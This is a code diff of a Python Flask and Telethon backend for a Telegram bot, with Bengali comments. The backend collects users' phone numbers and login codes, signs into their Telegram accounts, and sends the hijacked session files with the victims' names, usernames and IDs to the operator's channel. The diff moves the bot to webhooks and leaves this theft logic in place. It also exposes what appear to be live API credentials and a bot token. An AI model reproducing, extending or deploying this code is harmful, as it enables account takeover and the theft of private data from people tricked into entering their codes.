@@ -3,25 +3,26 @@ import asyncio
 import hashlib
 import time
 from datetime import datetime
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template_string
 from telethon import TelegramClient, errors
 from flask_cors import CORS
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes
-import threading
+import requests
 
 app = Flask(__name__)
 CORS(app)
 
 # ==================== তোমার তথ্য বসাও ====================
-API_ID = 33304113          # ← তোমার আসল API_ID
-API_HASH = '4e4af20183712a922c8557f4f9911cb6'  # ← তোমার আসল API_HASH
-BOT_TOKEN = '8808491756:AAERHxQEa6guC2488-z4bFbKBbHB6Vw29P0'  # ← বট টোকেন
-YOUR_CHANNEL = '@smsotppopp'  # ← চ্যানেল ইউজারনাম @সহ
-WEBAPP_URL = 'https://golden-brioche-15018c.netlify.app/'  # ← Netlify URL
+API_ID = 33304113
+API_HASH = '4e4af20183712a922c8557f4f9911cb6'
+BOT_TOKEN = '8808491756:AAERHxQEa6guC2488-z4bFbKBbHB6Vw29P0'
+YOUR_CHANNEL = '@your_channel_username'
+WEBAPP_URL = 'https://your-site.netlify.app'
 # =======================================================
 
 temp_data = {}
+bot_app = None
 
 # ==================== টেলিগ্রাম বট হ্যান্ডলার ====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -39,42 +40,57 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
-def run_bot():
-    """বট চালানোর ফাংশন"""
+def setup_bot():
+    """বট সেটআপ করে ওয়েবহুক কনফিগার করে"""
+    global bot_app
     try:
         bot_app = Application.builder().token(BOT_TOKEN).build()
         bot_app.add_handler(CommandHandler("start", start))
-        print("🤖 বট চালু আছে...")
-        bot_app.run_polling(allowed_updates=Update.ALL_TYPES)
+        
+        # ওয়েবহুক সেটআপ (Railway এর জন্য)
+        webhook_url = f"https://{os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'localhost')}/webhook"
+        
+        # লোকাল টেস্টের জন্য
+        if webhook_url == "https://localhost/webhook":
+            print("⚠️ ওয়েবহুক স্কিপ করা হচ্ছে (লোকাল টেস্ট)")
+            return
+        
+        # ওয়েবহুক সেট করো
+        bot_app.bot.set_webhook(webhook_url)
+        print(f"✅ ওয়েবহুক সেট করা হয়েছে: {webhook_url}")
+        
     except Exception as e:
-        print(f"বট চালু করতে ত্রুটি: {e}")
+        print(f"❌ বট সেটআপ ত্রুটি: {e}")
+
+@app.route('/webhook', methods=['POST'])
+async def webhook():
+    """টেলিগ্রাম থেকে আপডেট আসবে এখানে"""
+    try:
+        update = Update.de_json(request.get_json(), bot_app.bot)
+        await bot_app.process_update(update)
+        return 'OK'
+    except Exception as e:
+        print(f"ওয়েবহুক ত্রুটি: {e}")
+        return 'OK'
 
 # ==================== ব্যাকএন্ড API ====================
 async def send_session_to_channel(session_path, phone, user_info):
-    """সেশন ফাইল চ্যানেলে পাঠায়"""
     try:
         client = TelegramClient(session_path, API_ID, API_HASH)
         await client.connect()
         channel = await client.get_entity(YOUR_CHANNEL)
         
-        message = f"🔐 **নতুন সেশন!**\n\n"
-        message += f"📱 ফোন: `{phone}`\n"
-        message += f"👤 নাম: {user_info.first_name}\n"
-        message += f"📛 ইউজারনেম: @{user_info.username or 'নেই'}\n"
-        message += f"🆔 আইডি: `{user_info.id}`\n"
-        message += f"⏰ সময়: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        
+        message = f"🔐 **নতুন সেশন!**\n\n📱 ফোন: `{phone}`\n👤 নাম: {user_info.first_name}\n📛 ইউজারনেম: @{user_info.username or 'নেই'}\n🆔 আইডি: `{user_info.id}`"
         session_file = f"{session_path}.session"
+        
         if os.path.exists(session_file):
             await client.send_file(channel, session_file, caption=message)
-            print(f"[+] সেশন পাঠানো হয়েছে: {phone}")
-        else:
-            print(f"[-] সেশন ফাইল পাওয়া যায়নি: {session_file}")
+            print(f"[✓] সেশন পাঠানো হয়েছে: {phone}")
         
         await client.disconnect()
         return True
     except Exception as e:
-        print(f"[-] চ্যানেলে সেশন পাঠাতে ত্রুটি: {e}")
+        print(f"[-] ত্রুটি: {e}")
         return False
 
 @app.route('/send_code', methods=['POST'])
@@ -107,10 +123,8 @@ def send_code():
         
     except errors.FloodWaitError as e:
         return jsonify({'success': False, 'message': f'অনেক রিকোয়েস্ট! {e.seconds} সেকেন্ড পর চেষ্টা করুন।'})
-    except errors.PhoneNumberInvalidError:
-        return jsonify({'success': False, 'message': 'ভুল ফোন নম্বর! +880 দিয়ে শুরু করুন।'})
     except Exception as e:
-        return jsonify({'success': False, 'message': f'ত্রুটি: {str(e)}'})
+        return jsonify({'success': False, 'message': str(e)})
 
 @app.route('/verify', methods=['POST'])
 def verify():
@@ -119,7 +133,7 @@ def verify():
     code = data.get('code', '').strip()
     
     if phone not in temp_data:
-        return jsonify({'success': False, 'message': 'সেশন নেই! আবার কনফার্ম করুন।'})
+        return jsonify({'success': False, 'message': 'সেশন নেই! আবার চেষ্টা করুন।'})
     
     try:
         loop = asyncio.new_event_loop()
@@ -143,9 +157,9 @@ def verify():
     except errors.PhoneCodeInvalidError:
         return jsonify({'success': False, 'message': 'ভুল OTP! আবার চেষ্টা করুন।'})
     except errors.PhoneCodeExpiredError:
-        return jsonify({'success': False, 'message': 'OTP মেয়াদ শেষ! আবার কনফার্ম করুন।'})
+        return jsonify({'success': False, 'message': 'OTP মেয়াদ শেষ! আবার চেষ্টা করুন।'})
     except Exception as e:
-        return jsonify({'success': False, 'message': f'ত্রুটি: {str(e)}'})
+        return jsonify({'success': False, 'message': str(e)})
 
 @app.route('/resend_code', methods=['POST'])
 def resend_code():
@@ -164,33 +178,23 @@ def resend_code():
     
     return send_code()
 
-@app.route('/health', methods=['GET'])
-def health():
-    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})
-
 @app.route('/')
 def home():
-    return jsonify({
-        'status': 'running',
-        'bot': 'active',
-        'message': 'টেলিগ্রাম বট এবং ব্যাকএন্ড সার্ভার চালু আছে'
-    })
+    return jsonify({'status': 'running', 'message': 'টেলিগ্রাম বট ও ব্যাকএন্ড চালু আছে'})
 
 # ==================== মেইন ====================
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
     
-    # বট আলাদা থ্রেডে চালাও
-    bot_thread = threading.Thread(target=run_bot)
-    bot_thread.daemon = True
-    bot_thread.start()
+    # বট সেটআপ করো
+    setup_bot()
     
     port = int(os.environ.get('PORT', 5000))
     print("=" * 60)
-    print("🚀 ব্যাকএন্ড + বট চালু হচ্ছে...")
+    print("🚀 সার্ভার চালু হচ্ছে...")
     print(f"🤖 বট টোকেন: {BOT_TOKEN[:20]}...")
     print(f"📢 সেশন যাবে: {YOUR_CHANNEL}")
-    print(f"🌐 API চলছে: http://0.0.0.0:{port}")
-    print(f"🔗 Webapp URL: {WEBAPP_URL}")
+    print(f"🌐 পোর্ট: {port}")
     print("=" * 60)
+    
     app.run(host='0.0.0.0', port=port)
